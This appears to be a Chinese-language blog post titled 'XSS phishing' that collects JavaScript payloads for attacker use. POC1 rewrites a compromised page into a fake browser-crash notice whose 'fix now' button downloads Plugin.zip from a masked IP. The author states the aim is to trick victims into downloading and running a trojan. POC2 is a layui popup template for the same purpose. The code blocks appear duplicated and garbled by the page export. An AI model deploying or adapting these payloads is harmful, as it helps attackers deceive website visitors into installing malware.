<!DOCTYPE html><html lang="zh"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="stylesheet" href="/css/post.css"><link rel="icon" href="/img/favicon.png"><title>XSS钓鱼</title><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body>　　<div class="inner"><h2>XSS钓鱼</h2><p>整理下payload，可能会用得上，具体原理可以看我<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/263612.html">之前freebuf上写过的一篇文章</a>，其实很简单，在有XSS漏洞之后可以注入JS完全重写整个html页面，用来诱惑对方下载执行木马。</p>
<p>POC1:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre class=" language-hljs javascript"><span class="hljs-keyword">var</span> body = <span class="hljs-built_in">document</span>.body;<br>  <span class="hljs-keyword">var</span> _left =  <span class="hljs-built_in">window</span>.innerWidth * <span class="hljs-number">0.3</span> + <span class="hljs-string">&#x27;px&#x27;</span>;<br>  <span class="hljs-keyword">var</span> _top = <span class="hljs-built_in">window</span>.innerHeight * <span class="hljs-number">0.3</span> + <span class="hljs-string">&#x27;px&#x27;</span>;<br>  <span class="hljs-keyword">var</span> _height = <span class="hljs-built_in">window</span>.innerHeight<br>  body.innerHTML=<span class="hljs-string">`&lt;div style=&quot;background-color: white;height: <span class="hljs-subst">$&#123;_height&#125;</span>px&quot;&gt;&lt;div style=&#x27;position:absolute;top:<span class="hljs-subst">$&#123;_top&#125;</span>;left:<span class="hljs-subst">$&#123;_left&#125;</span>;height:300px;width:600px;&#x27;&gt;&lt;img src=&#x27;http://39.*.*.*/sdp.png&#x27; style=&#x27;margin:3px;&#x27;&gt;</span><br><span class="hljs-string">        &lt;p&gt;&lt;h3 &gt;喔唷，崩溃啦!&lt;/h3&gt;&lt;/p &gt;</span><br><span class="hljs-string">        &lt;p style=&#x27;color:gray&#x27;&gt;显示此网页时出了点问题，请在您的页面上启用显示插件，从而可能会有所帮助。&lt;/br&gt;&lt;/p &gt;</span><br><span class="hljs-string">        &lt;a href=&#x27;http://*.*.*.*/Plugin.zip&#x27;&gt;</span><br><span class="hljs-string">        &lt;button style=&#x27;margin-left:85%;height:30px;line-hight:30px;outline:none;border:none;background-color:rgb(26,115,232);color:white&#x27;  &gt;立即修复&lt;/button&gt;&lt;/a&gt;</span><br><span class="hljs-string"><code class="language-hljs javascript"><span class="hljs-keyword">var</span> body = <span class="hljs-built_in">document</span>.body;<br>  <span class="hljs-keyword">var</span> _left =  <span class="hljs-built_in">window</span>.innerWidth * <span class="hljs-number">0.3</span> + <span class="hljs-string">&#x27;px&#x27;</span>;<br>  <span class="hljs-keyword">var</span> _top = <span class="hljs-built_in">window</span>.innerHeight * <span class="hljs-number">0.3</span> + <span class="hljs-string">&#x27;px&#x27;</span>;<br>  <span class="hljs-keyword">var</span> _height = <span class="hljs-built_in">window</span>.innerHeight<br>  body.innerHTML=<span class="hljs-string">`&lt;div style=&quot;background-color: white;height: <span class="hljs-subst">$&#123;_height&#125;</span>px&quot;&gt;&lt;div style=&#x27;position:absolute;top:<span class="hljs-subst">$&#123;_top&#125;</span>;left:<span class="hljs-subst">$&#123;_left&#125;</span>;height:300px;width:600px;&#x27;&gt;&lt;img src=&#x27;http://39.*.*.*/sdp.png&#x27; style=&#x27;margin:3px;&#x27;&gt;</span><br><span class="hljs-string">        &lt;p&gt;&lt;h3 &gt;喔唷，崩溃啦!&lt;/h3&gt;&lt;/p &gt;</span><br><span class="hljs-string">        &lt;p style=&#x27;color:gray&#x27;&gt;显示此网页时出了点问题，请在您的页面上启用显示插件，从而可能会有所帮助。&lt;/br&gt;&lt;/p &gt;</span><br><span class="hljs-string">        &lt;a href=&#x27;http://*.*.*.*/Plugin.zip&#x27;&gt;</span><br><span class="hljs-string">        &lt;button style=&#x27;margin-left:85%;height:30px;line-hight:30px;outline:none;border:none;background-color:rgb(26,115,232);color:white&#x27;  &gt;立即修复&lt;/button&gt;&lt;/a&gt;</span><br><span class="hljs-string">      </div></div></span><br></code></pre></td></tr></table></figure>

<p>POC2:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre class=" language-hljs javascript">layui.use(<span class="hljs-string">&#x27;layer&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-keyword">var</span> layer = layui.layer <span class="hljs-comment">//弹层</span><br>      layer.open(&#123;<br>		  <span class="hljs-attr">type</span>: <span class="hljs-number">1</span>,<br>		  <span class="hljs-attr">skin</span>: <span class="hljs-string">&#x27;layui-layer-rim&#x27;</span>, <span class="hljs-comment">//加上边框</span><br>		  <span class="hljs-attr">area</span>: [<span class="hljs-string">&#x27;420px&#x27;</span>, <span class="hljs-string">&#x27;240px&#x27;</span>], <span class="hljs-comment">//宽高</span><br>		  <span class="hljs-attr">content</span>: <span class="hljs-string"><code class="language-hljs javascript">layui.use(<span class="hljs-string">&#x27;layer&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-keyword">var</span> layer = layui.layer <span class="hljs-comment">//弹层</span><br>      layer.open(&#123;<br>		  <span class="hljs-attr">type</span>: <span class="hljs-number">1</span>,<br>		  <span class="hljs-attr">skin</span>: <span class="hljs-string">&#x27;layui-layer-rim&#x27;</span>, <span class="hljs-comment">//加上边框</span><br>		  <span class="hljs-attr">area</span>: [<span class="hljs-string">&#x27;420px&#x27;</span>, <span class="hljs-string">&#x27;240px&#x27;</span>], <span class="hljs-comment">//宽高</span><br>		  <span class="hljs-attr">content</span>: <span class="hljs-string">&#x27;html内容&#x27;</span><br>		&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>

</div><script src="/js/jquery.min.js"></script><script src="/js/main.js"></script></body></html>